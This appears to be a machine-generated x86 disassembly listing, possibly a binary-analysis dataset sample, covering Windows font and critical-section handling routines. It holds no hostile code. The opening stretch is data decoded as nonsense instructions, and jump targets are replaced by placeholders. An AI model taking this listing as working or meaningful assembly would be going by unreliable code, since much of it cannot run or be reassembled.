add [ eax ] al
jmp [ eax ]
mov ebp 0x7070046
push esp
inc ebx
popad
outsb
jbe r-xdata
xchg [ ecx - 0x33330005 ] edx
int3
mov ebx 0x100046
add bh bh
hlt
in al 0xe7
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
mov ebp 0x1d540046
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add al 0xdc
jmp sub_424fa8
dec ebp
imul esp [ ebx + 0x73 ] 0xbc640004
inc esi
add [ eax + eax ] dl
add bh bh
add al ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x60 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ebx + 0x4875c40 ] cl
and al 0xc3
add eax 0xffffffdc
insb
push esi
inc esp
sub_46be5c
cmp [ esi + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi - 0x40d7ffba ] bh
inc esi
add [ eax + eax ] ch
add [ eax ] al
int3
sub_46be81
sbb eax 0x940042
inc edi
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] bh
dec edi
inc edx
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
inc edx
add ah ch
inc [ esi ]
ror [ ebp + 0x42 ] 0x0
enter 0x424f 0x0
jl r-xdata
inc esi
add [ eax + 0x40004479 ] dl
inc [ esi ]
push esp
inc [ esi ]
nop
jns r-xdata
add [ eax - 0x43ffbb87 ] dl
add [ edi ] eax
add [ eax ] eax
std
[ eax ]
add [ eax - 0x3bffbb87 ] dl
add [ edi ] al
int3
sub_46bf25
add [ edi ] eax
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffb8fb ] bh
imul esp [ ebx - 0x70 ] 0xbf389090
inc esi
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ esi + eax ] al
inc edi
add [ eax + 0x6 ] ch
inc edi
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
nop
nop
nop
mov al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
rol [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] al
inc esi
add [ eax + eax ] al
add [ eax - 0x42 ] bl
inc esi
add [ eax + eax - 0x7d8bffb9 ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] bh
dec edi
inc edx
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah bh
adc [ edi ] al
nop
dec esi
inc edx
add ah ch
inc [ esi ]
cmp [ ecx ] dl
inc edi
add al cl
dec edi
inc edx
add [ eax ] bh
adc eax [ edi ]
rcl [ ebx ] 0x47
add [ esi + edx + 0x47 ] ch
add [ edi + edi * 8 + 0x46 ] dl
add [ ecx + ebx + 0x1a400047 ] cl
inc edi
add [ eax - 0x33ffb8e6 ] al
add [ edi ] al
mov al [ 0xffffffff8c00471c ]
and [ edi ] al
mov ah 0x28
inc edi
add [ eax + 0x29 ] al
inc edi
add al bl
add [ edi ] eax
jl r-xdata
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
jns r-xdata
add [ fs : eax + eax - 0x48 ] 0x90004705
imul esp [ ebx - 0x50 ] 0x5c0046be
push ds
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
sbb [ edi ] eax
push eax
sbb al [ edi ]
js r-xdata
inc edi
add [ ebx + ebp + 0x1b180047 ] cl
inc edi
add [ eax - 0x2bffb8f0 ] dl
add [ edi ] al
pushad
add [ edi ] eax
push 0x6400471f
inc edi
add ah ah
push ds
inc edi
add [ esi + ebp + 0x47 ] ch
add [ edi + ebp ] cl
inc edi
add al dh
jo r-xdata
imul esp [ ebx + 0x73 ] 0x90900000
mov cl al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 + 0x1c0046 ] cl
add [ eax ] al
pop eax
mov edi 0x826c0046
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edi + ebp + 0x47 ] ch
add [ edi + ebp + 0x540a0047 ] bl
inc edi
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x46c11070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x46c08870
add [ edi + edi * 4 ] dh
inc esi
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
nop
nop
nop
sbb al 0xc0
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
rol [ esi ] 0x78
add [ eax ] al
add [ eax - 0x41 ] bl
inc esi
add [ edx + eax * 4 + 0x44 ] ch
dec ecx
imul esp [ ebx + 0x73 ] 0xb0900000
mov edi 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xbf
inc esi
add [ eax + eax ] cl
add [ eax ] al
loopne r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
pushfd
das
inc edi
add [ edx ] cl
push esp
jo r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al al
inc esi
add [ eax ] bh
add [ eax ] al
pop eax
mov edi 0x826c0046
inc esp
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
dec ecx
insd
popad
nop
outsb
sub_46c2a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_46c2c0
sub [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x700046c3
retn
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
retn
sub_46c2f2
inc esi
add [ ecx ] al
add bh bh
push [ esi + eax * 8 ]
inc esi
add [ eax ] dl
push esp
push edx
jae r-xdata
push esp
inc edx
jb r-xdata
jne r-xdata
push es
add [ ebx + ebx * 8 - 0x3974f882 ] al
jae r-xdata
push 0x6f736552
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
push edx
jae r-xdata
call sub_4486e4
pop es
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
retn 0x46
nop
nop
push 0x46c3
add [ eax ] al
pop esi
pop ebx
retn
mov eax esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] ch
inc esi
add [ eax - 0x3d ] dh
inc esi
add [ eax ] ch
add [ eax ] al
add [ edx + eax * 8 - 0x7d93ffba ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
retn
nop
sub_46c39c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46c3d8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46c414
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_46c388
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_46c3fc
xor edx edx
push ebp
push sub_46c4e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4ef
mov eax [ ebp - 0x4 ]
call sub_46c408
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_44748c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4476cc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_434e78
test al al
je r-xdata
sub_46c4f8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_46c3fc
xor ecx ecx
push ebp
push sub_46c580
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c408
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_46c5bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46c3fc
xor eax eax
push ebp
push sub_46c625
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c414
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46c4f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c62c
mov eax [ ebp - 0x4 ]
call sub_46c408
retn
mov eax ebx
mov si 0xfffd
call sub_4483f8
sub_46c638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46c3fc
xor eax eax
push ebp
push sub_46c694
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c69b
mov eax [ ebp - 0x4 ]
call sub_46c408
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4483f8
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46c4f8
sub_46c6bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46c3fc
xor eax eax
push ebp
push sub_46c71c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c723
mov eax [ ebp - 0x4 ]
call sub_46c408
retn
mov esi ebx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push edi
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_46c72c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_424b88
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46c7c9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4246e8
mov ebx eax
mov eax ebx
call sub_46e3b0
inc [ ebp - 0x4 ]
mov eax ebx
call sub_46e8ec
mov eax [ rw-data ]
call sub_46c6bc
mov eax [ rw-data ]
call sub_46c6bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c7d0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4246e8
call sub_46e7bc
inc esi
dec ebx
jne r-xdata
sub_46d277
dec [ ebx ]
add [ eax ] al
add [ edi ] cl
inc ebp
add [ ebp ] cl
pop edi
add [ ebx ] al
dec eax
add [ ecx ] al
push edx
add [ ebx ] dl
inc ebp
add [ eax + eax ] dl
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_424030
retn
sub_46d2b4
push ebp
mov ebp esp
add esp 0xfffffea0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x160 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46d3b1
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov edi ebx
mov esi rw-data
mov ecx 0x23
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d3b8
lea eax [ ebp - 0x160 ]
call j_sub_449348
retn
lea eax [ ebp - 0x5c ]
push eax
push 0x5c
push esi
call GetObjectW
test eax eax
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebx + 0x4 ] eax
cmp [ ebp - 0x4c ] 0x2bc
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x1
cmp [ ebp - 0x47 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x2
cmp [ ebp - 0x46 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x4
movzx eax [ ebp - 0x45 ]
mov [ ebx + 0xe ] al
lea eax [ ebp - 0x160 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x20
call sub_449f14
mov eax [ ebp - 0x160 ]
lea edx [ ebp - 0x15c ]
call sub_44bc1c
lea edx [ ebp - 0x15c ]
lea eax [ ebx + 0xf ]
mov cl 0x7c
call sub_447a58
movzx eax [ ebp - 0x41 ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0xd ] 0x8
mov [ ebx + 0xc ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_46d3c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_46c414
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46d420
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_46c4f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46d470
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46d52b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_46cf68
xor eax eax
push ebp
push sub_46d50e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c638
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_46d5ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d515
mov eax [ ebp - 0x8 ]
call sub_46cf78
retn
mov eax ebx
call sub_46d920
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46d93c
sub_46d55c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46d5a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c5bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d5a8
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46d5c0
push ebx
mov ebx eax
movzx eax [ ebx + 0xe ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop ebx
retn
mov eax rw-data
lea edx [ ebx + 0xf ]
movzx ecx [ eax ]
inc ecx
call sub_447a74
je r-xdata
mov al 0x1
pop ebx
retn
sub_46d5ec
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
xor edx edx
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46d7da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d7e1
lea eax [ ebp - 0x6c ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ rw-data ]
call sub_46c3fc
xor edx edx
push ebp
push sub_46d7aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_46c408
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x68 ] eax
xor eax eax
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x1
je r-xdata
mov [ ebp - 0x58 ] 0x190
mov [ ebp - 0x58 ] 0x2bc
jmp r-xdata
mov [ ebp - 0x51 ] al
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x2
setne al
mov [ ebp - 0x54 ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x4
setne al
mov [ ebp - 0x53 ] al
mov eax [ ebp - 0xc ]
test [ eax + 0x1d ] 0x8
setne al
mov [ ebp - 0x52 ] al
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x1e ]
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x1f ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44bd80
lea eax [ ebp - 0x4c ]
mov ecx 0x1f
mov edx [ ebp - 0x8 ]
call sub_4361d0
mov esi rw-data
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bd80
lea eax [ ebp - 0x4c ]
mov ecx 0x1f
mov edx [ ebp - 0x4 ]
call sub_4361d0
jmp r-xdata
movzx eax [ rw-data ]
mov [ ebp - 0x51 ] al
jmp r-xdata
mov [ ebp - 0x4e ] 0x0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
call sub_473554
cmp al 0x80
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
lea eax [ ebp - 0x6c ]
mov edx [ ebp - 0xc ]
add edx 0x1f
call sub_449fb8
mov eax [ ebp - 0x6c ]
mov edx r-xdata
call sub_434f0c
test eax eax
jne r-xdata
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x50 ] 0x7
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x10
call sub_46d5c0
test al al
je r-xdata
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x4f ] 0x0
mov eax ebx
call sub_46d9a8
dec al
je r-xdata
mov [ ebp - 0x51 ] 0x80
lea eax [ ebp - 0x68 ]
push eax
call CreateFontIndirectW
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4d ] 0x0
sub_46d808
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_46d2b4
mov edx esp
mov eax ebx
call sub_46d55c
add esp 0x8c
pop esi
pop ebx
retn
sub_46d838
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d830
cmp esi eax
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46d544
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_46d55c
sub_46d870
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_46d8b7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x10 ]
lea ebx [ eax + 0x1f ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44bd80
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8be
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_46d8c4
push ebx
push esi
add esp 0xfffffe74
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x18c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46d544
lea eax [ esp + 0xf ]
xor ecx ecx
mov edx 0x7d
call sub_447ae4
lea edx [ esp + 0x8c ]
mov eax esi
call sub_44bc1c
lea edx [ esp + 0x8c ]
lea eax [ esp + 0xf ]
mov cl 0x7c
call sub_447a58
mov edx esp
mov eax ebx
call sub_46d55c
sub_46d93c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_46d838
pop esi
pop ebx
retn
sub_46d968
push ebx
add esp 0xffffff70
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_46d95c
cmp al [ esp ]
je r-xdata
add esp 0x90
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46d544
movzx eax [ esp ]
mov [ esp + 0x11 ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46d55c
sub_46d9b0
push ebx
push esi
add esp 0xffffff74
mov ebx edx
mov esi eax
mov eax esi
call sub_46d9a8
cmp bl al
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_46d544
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_46d55c
sub_46d9f0
push ebx
push esi
add esp 0xffffff74
mov ebx edx
mov esi eax
mov eax esi
call sub_46d9e8
cmp bl al
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
